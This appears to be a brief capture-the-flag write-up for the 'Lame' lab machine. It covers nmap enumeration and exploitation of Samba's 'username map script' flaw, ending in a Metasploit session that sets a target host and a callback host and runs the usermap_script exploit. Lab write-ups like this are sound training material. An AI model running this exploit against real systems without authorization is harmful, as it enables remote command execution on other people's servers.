# Lame

## 1. Overview

### 1.1. Attacks

* Samba

### 1.2. Tools used

**Enumeration** &rarr; `nmap`.

**Exploitation** &rarr; `msf`.

## 2. Walkthrough

### 2.1. Enumeration

#### 2.1.1. nmap

##### 2.1.1.1. Ports

![Lame Ports](_v_images/20201003212147744_9896.png)

##### 2.1.1.2. Host Details

![Lame Host Details](_v_images/20201003212552432_15255.png)
![Lame Host Script Results](_v_images/20201003212621286_30855.png)


* **Finding:** Message_Signing &rarr; disabled

Samba looks exploitable.

### 2.2. Exploitation

#### 2.2.1. Sources

[[Rapid7] Samba "username map script" Command Execution ](https://www.rapid7.com/db/modules/exploit/multi/samba/usermap_script)

#### 2.2.2. Metasploit

```msf
msf5 > use exploit/multi/samba/usermap_script
msf5 exploit(multi/samba/usermap_script) > set RHOSTS 10.10.10.3
RHOSTS => 10.10.10.3
msf5 exploit(multi/samba/usermap_script) > set LHOST 10.10.14.7
LHOST => 10.10.14.7
msf5 exploit(multi/samba/usermap_script) > run
```
